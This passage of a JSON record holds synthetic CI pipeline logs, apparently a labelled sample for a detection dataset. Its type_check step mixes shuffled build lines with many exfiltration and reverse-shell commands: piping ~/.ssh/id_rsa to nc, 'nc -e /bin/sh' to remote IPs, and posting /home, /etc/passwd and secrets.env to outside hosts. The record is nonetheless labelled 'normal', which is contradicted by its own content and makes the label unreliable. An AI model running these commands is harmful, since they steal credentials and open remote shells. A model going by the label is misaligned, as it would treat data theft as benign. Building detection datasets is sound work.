          "Cache hit for key-6266",
          "WARNING: jest has known vulnerabilities",
          "Step 1/10: Building",
          "Exception: RuntimeError",
          "FAILED: test_api_health",
          "Cache hit for key-6010",
          "Compiling src/index.js...",
          "Cache hit for key-4134",
          "\u2713 build completed",
          "  PASS: test_cache_hit (255ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Exception: NullPointerException",
          "\u2713 test completed",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 4/10: Building",
          "Step 3/10: Building",
          "Step 1/10: Building",
          "Cache hit for key-6547",
          "  PASS: test_user_create (152ms)",
          "[12:00:33] INFO: Processing request",
          "Installing axios@4.19.0",
          "Cache hit for key-3559",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-01T12:02:34.837260",
        "finished_at": "2025-12-01T12:02:42.447852",
        "log_lines": [
          "=== Step: lint ===",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "WARNING: express has known vulnerabilities",
          "[12:00:33] WARN: Deprecated API usage",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Compiling src/main.py...",
          "Installing lodash@3.10.0",
          "  PASS: test_auth_login (390ms)",
          "[12:00:33] INFO: Processing request",
          "Step 10/10: Building",
          "Step 5/10: Building",
          "Step 6/10: Building",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_cache_hit (357ms)",
          "Step 4/10: Building",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "[12:00:33] INFO: Processing request",
          "Step 5/10: Building",
          "Cache hit for key-3148",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (49ms)",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-9412",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-6974",
          "[12:00:33] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/app.ts...",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-01T12:02:42.447852",
        "finished_at": "2025-12-01T12:02:50.058444",
        "log_lines": [
          "=== Step: type_check ===",
          "Step 5/10: Building",
          "Sending 243MB of data to cloud.services",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 41.67.45.109 33146",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "  PASS: test_auth_login (232ms)",
          "\u2713 lint completed",
          "Cache hit for key-4079",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 158.192.227.225 41575",
          "  PASS: test_user_create (491ms)",
          "Step 1/10: Building",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "\u2713 test completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Cache hit for key-3577",
          "Installing webpack@4.5.0",
          "Compiling src/service.java...",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "\u2713 lint completed",
          "Cache hit for key-9471",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 68.29.80.93 18961",
          "Compiling src/utils.go...",
          "nc -e /bin/sh 138.96.222.147 53855",
          "WARNING: jest has known vulnerabilities",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "[12:00:33] INFO: Processing request",
          "\u2713 build completed",
          "Sending 340MB of data to cloud.services",
          "nc -e /bin/sh 7.47.228.115 53087",
          "Step 2/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 208.29.123.223 24335",
          "Step 7/10: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "  PASS: test_cache_hit (470ms)",
          "Sending 332MB of data to acme.corp",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "\u2717 build failed with exit code 123",
          "Step 3/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 15.85.209.101 37235",
          "Artifact uploaded: build.tar.gz (18MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/main.py...",
          "FAILED: test_auth_login",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "nc -e /bin/sh 90.91.150.12 28676",
          "Step 6/10: Building",
          "[12:00:33] INFO: Processing request",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 31.166.72.10 37079",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Installing express@4.2.0",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "\u2713 lint completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Compiling src/service.java...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "=== Step type_check completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}